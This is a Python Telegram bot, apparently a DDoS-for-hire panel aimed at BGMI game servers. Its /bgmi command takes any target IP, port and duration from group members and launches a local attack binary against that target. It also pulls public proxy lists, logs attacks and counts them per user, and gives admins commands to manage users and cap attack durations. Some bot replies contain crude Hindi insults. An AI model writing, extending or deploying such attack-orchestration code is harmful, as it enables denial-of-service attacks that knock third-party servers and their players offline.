import logging
import subprocess
import asyncio
import itertools
import requests
import os
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, GROUP_ID, GROUP_LINK, DEFAULT_THREADS

# Proxy-related functions
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'
proxy_iterator = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        logging.error(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
        if proxy_iterator is None:  # If proxies are not available
            return None
    return next(proxy_iterator, None)

# Global variables
user_processes = {}
active_attack = False  # Track if an attack is in progress
MAX_DURATION = 240  # Default max attack duration in seconds
user_durations = {}  # Dictionary to store max durations for specific users
# Global variable to store user attack counts
user_attack_counts = {}



# File paths
USERS_FILE = "users.txt"
LOGS_FILE = "logs.txt"
# Load attack counts from file (if needed)
ATTACKS_FILE = "attacks.txt"

# Ensure commands are executed in the correct group
async def ensure_correct_group(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if update.effective_chat.id != GROUP_ID:
        await update.message.reply_text(f"❌ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗶𝗻 𝗮 𝘀𝗽𝗲𝗰𝗶𝗳𝗶𝗰 𝗴𝗿𝗼𝘂𝗽. 𝗝𝗼𝗶𝗻 𝗵𝗲𝗿𝗲:- {GROUP_LINK}")
        return False
    return True

# Read users from file
def read_users():
    try:
        if not os.path.exists(USERS_FILE):
            return []
        with open(USERS_FILE, "r") as f:
            users = []
            for line in f:
                parts = line.strip().split(",")
                if len(parts) == 2:
                    users.append(parts)
            return users
    except Exception as e:
        logging.error(f"Error reading users file: {str(e)}")
        return []

# Save user information
async def save_user_info(user_id, username):
    try:
        existing_users = {}
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                for line in f:
                    parts = line.strip().split(",")
                    if len(parts) == 2:
                        uid, uname = parts
                        existing_users[uid] = uname

        if str(user_id) not in existing_users:
            with open(USERS_FILE, "a") as f:
                f.write(f"{user_id},{username}\n")
    except Exception as e:
        logging.error(f"Error saving user info: {str(e)}")


def load_attack_counts():
    global user_attack_counts
    if os.path.exists(ATTACKS_FILE):
        try:
            with open(ATTACKS_FILE, "r") as f:
                for line in f:
                    uid, count = line.strip().split(",")
                    user_attack_counts[int(uid)] = int(count)
        except Exception as e:
            logging.error(f"Error loading attack counts: {str(e)}")

def save_attack_counts():
    try:
        with open(ATTACKS_FILE, "w") as f:
            for uid, count in user_attack_counts.items():
                f.write(f"{uid},{count}\n")
    except Exception as e:
        logging.error(f"Error saving attack counts: {str(e)}")

# Save attack logs
async def save_attack_log(user_id, target_ip, port, duration):
    global user_attack_counts
    try:
        with open(LOGS_FILE, "a") as f:
            f.write(f"User: {user_id}, Target: {target_ip}:{port}, Duration: {duration}s\n")
        
        # Increment user attack count
        if user_id in user_attack_counts:
            user_attack_counts[user_id] += 1
        else:
            user_attack_counts[user_id] = 1
        
        # Save updated attack counts
        save_attack_counts()
    except Exception as e:
        logging.error(f"Error saving attack log: {str(e)}")


async def attacks(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
        return

    # Load attack data
    load_attack_counts()

    # Prepare attack report
    report_lines = []
    grand_total = 0

    for uid, count in user_attack_counts.items():
        # Default values
        username = "Unknown"
        display_name = "Unknown"

        # Find user info
        for u_id, u_name in read_users():
            if int(u_id) == uid:
                username = u_name  # Extract username
                user = await context.bot.get_chat(uid)  # Fetch user info
                display_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
                break

        report_lines.append(
            f"𝐔𝐈𝐃:-   {uid}, \n𝐍𝐚𝐦𝐞:-   {display_name}, \n𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞:-   @{username}, \n𝐀𝐭𝐭𝐚𝐜𝐤𝐬:-   {count}\n **************************"
        )
        grand_total += count

    # Add grand total
    report_lines.append(f"\n👥 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬:- {grand_total}")

    # Send report
    if report_lines:
        await update.message.reply_text("\n".join(report_lines))
    else:
        await update.message.reply_text("⚠️ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝗮𝘁𝗮 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")


async def start_attack(target_ip, port, duration, user_id, original_message, context):
    global active_attack
    command = ['./xxxx', target_ip, str(port), str(duration)]

    try:
        process = await asyncio.create_subprocess_exec(*command)
        if not process:
            return  # Silently exit if subprocess creation fails

        user_processes[user_id] = {
            "process": process,
            "target_ip": target_ip,
            "port": port,
            "duration": duration
        }

        await asyncio.wait_for(process.wait(), timeout=duration)

        del user_processes[user_id]
        active_attack = False  # Reset the flag after the attack finishes

        try:
            await original_message.reply_text(f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗼𝗻 {target_ip}:{port} 𝗳𝗼𝗿 {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀.")
        except Exception:
            pass  # Silently ignore all errors when sending the reply

    except asyncio.TimeoutError:
        if process and process.returncode is None:
            process.terminate()
            await process.wait()
        if user_id in user_processes:
            del user_processes[user_id]
        active_attack = False
        try:
            await context.bot.send_message(
                chat_id=GROUP_ID,  # Send the message to the group
                text=f"⚠️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗲𝗿𝗺𝗶𝗻𝗮𝘁𝗲𝗱 𝗮𝘀 𝗶𝘁 𝗲𝘅𝗰𝗲𝗲𝗱𝗲𝗱 𝘁𝗵𝗲 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗼𝗻 {target_ip}:{port}."
            )
        except Exception:
            pass

    except Exception:
        if user_id in user_processes:
            del user_processes[user_id]
        active_attack = False

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return
    await update.message.reply_text("👋 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝘁𝗵𝗲 𝗔𝘁𝘁𝗮𝗰𝗸 𝗕𝗼𝘁!\n𝗨𝘀𝗲 /𝗯𝗴𝗺𝗶 <𝗜𝗣> <𝗣𝗢𝗥𝗧> <𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡> 𝘁𝗼 𝘀𝘁𝗮𝗿𝘁 𝗮𝗻 𝗮𝘁𝘁𝗮𝗰𝗸.")

# BGMI command handler
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global active_attack
    if not await ensure_correct_group(update, context):
        return

    user = update.message.from_user
    user_id = user.id
    username = user.username or "Unknown"

    await save_user_info(user_id, username)

    if active_attack:
        await update.message.reply_text("🚫 𝗥𝘂𝗸 𝗝𝗮𝗮 𝗕𝗵𝗼𝘀𝗱𝗶𝗸𝗲....")
        return

    if len(context.args) != 3:
        await update.message.reply_text("🛡️ 𝗨𝘀𝗮𝗴𝗲: /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        return

    target_ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except ValueError:
        await update.message.reply_text("⚠️ 𝗣𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗶𝗻𝘁𝗲𝗴𝗲𝗿𝘀.")
        return

    max_duration = user_durations.get(user_id, MAX_DURATION)
    if duration > max_duration:
        await update.message.reply_text(f"⚠️ 𝗬𝗼𝘂𝗿 𝗺𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝘀 {max_duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗮𝘀 𝘀𝗲𝘁 𝗯𝘆 𝘁𝗵𝗲 𝗮𝗱𝗺𝗶𝗻.")
        duration = max_duration

    await save_attack_log(user_id, target_ip, port, duration)

    attack_message = await update.message.reply_text(f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝘀𝘁𝗮𝗿𝘁𝗲𝗱 𝗼𝗻 {target_ip}:{port} 𝗳𝗼𝗿 {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘄𝗶𝘁𝗵 {DEFAULT_THREADS} 𝘁𝗵𝗿𝗲𝗮𝗱𝘀.")

    active_attack = True
    asyncio.create_task(start_attack(target_ip, port, duration, user_id, attack_message, context))

# Set max duration command (Admin-only)
async def set_duration(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
        return

    if len(context.args) != 2:
        await update.message.reply_text("🛡️ 𝗨𝘀𝗮𝗴𝗲: /𝘀𝗲𝘁 <𝘂𝗶𝗱/𝘂𝘀𝗲𝗿𝗻𝗮𝗺𝗲> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻>")
        return

    try:
        target = context.args[0]
        duration = int(context.args[1])

        if target.isdigit():
            user_durations[int(target)] = duration
        else:
            user_found = False
            for uid, uname in read_users():
                if uname == target:
                    user_durations[int(uid)] = duration
                    user_found = True
                    break
            if not user_found:
                await update.message.reply_text("⚠️ 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
                return

        await update.message.reply_text(f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝘀𝗲𝘁 𝘁𝗼 {duration} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗳𝗼𝗿 {target}.")
    except ValueError:
        await update.message.reply_text("⚠️ 𝗗𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗺𝘂𝘀𝘁 𝗯𝗲 𝗮𝗻 𝗶𝗻𝘁𝗲𝗴𝗲𝗿.")

# View logs command (Admin-only)
async def logs(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
        return

    try:
        with open(LOGS_FILE, "r") as f:
            logs = f.read()
        await update.message.reply_text(f"📊 Attack logs:\n{logs}")
    except Exception as e:
        await update.message.reply_text("⚠️ 𝗡𝗼 𝗹𝗼𝗴𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")

# View users command (Admin-only)
async def users(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await ensure_correct_group(update, context):
        return

    user_id = update.message.from_user.id
    if user_id not in map(int, ADMIN_IDS):
        await update.message.reply_text("❌ 𝗕𝗮𝗱𝗺𝗼𝘀𝗶 𝗡𝗮𝗵𝗶 𝗠𝗶𝘁𝘁𝗮𝗿..!!!")
        return

    try:
        with open(USERS_FILE, "r") as f:
            users = f.read()
        await update.message.reply_text(f"👥 Users:\n{users}")
    except Exception as e:
        await update.message.reply_text("⚠️ 𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲.")

# Main application setup
if __name__ == '__main__':
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("bgmi", bgmi))
    app.add_handler(CommandHandler("set", set_duration))
    app.add_handler(CommandHandler("logs", logs))
    app.add_handler(CommandHandler("users", users))
    app.add_handler(CommandHandler("attacks", attacks))  # New command
    app.run_polling()
